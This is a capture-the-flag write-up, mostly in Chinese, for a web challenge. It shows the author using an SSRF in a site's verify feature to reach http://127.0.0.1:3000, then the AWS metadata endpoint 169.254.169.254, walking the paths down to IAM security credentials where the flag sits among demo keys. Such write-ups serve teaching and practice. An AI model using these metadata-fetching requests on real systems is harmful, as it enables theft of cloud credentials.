# The Upgrade Tunnel

## 題目描述

A private service hums behind the marketplace edge. Can you make the front door ask for something it was never meant to reach?

## 解題思路

在 `/vendor-application` 這個頁面可以看到有一個 verify 的功能，基本上就是很明顯的 SSRF 了，因為他不只回覆驗證成不成功，還回覆了目標網頁內容，並且使用 `http://127.0.0.1:3000` 也可以正常看到首頁內容

SSRF 就是要找內部路徑，我找了很多像是 `/flag.txt` 和 `/flag` 等都沒東西，所以想說試試看 `http://169.254.169.254/`，這個東西在 AWS 當中是 IMDS 的固定位址，然後訪問 `http://169.254.169.254/latest/meta-data/` 還真的有東西

```json
{
    "success": true,
    "message": "Website verification successful",
    "body": "instance-id\nhostname\niam/security-credentials/\nplacement/region\n"
}
```

所以就慢慢挖，最後是在 `http://169.254.169.254/latest/meta-data/iam/security-credentials/RiffhackVendorVerifierRole` 裡面看到 flag

```json
{
    "success": true,
    "message": "Website verification successful",
    "body": "{\n  \"Code\": \"Success\",\n  \"LastUpdated\": \"2026-05-20T09:00:00Z\",\n  \"Type\": \"AWS-HMAC\",\n  \"AccessKeyId\": \"ASIA2026RIFFHACKDEMO\",\n  \"SecretAccessKey\": \"redacted-training-secret\",\n  \"Token\": \"bitflag{w3bs0ck3t_upgr4d3_ssrf_2026}\",\n  \"Expiration\": \"2026-05-20T15:00:00Z\"\n}\n"
}
```

## Flag

```text
bitflag{w3bs0ck3t_upgr4d3_ssrf_2026}
```
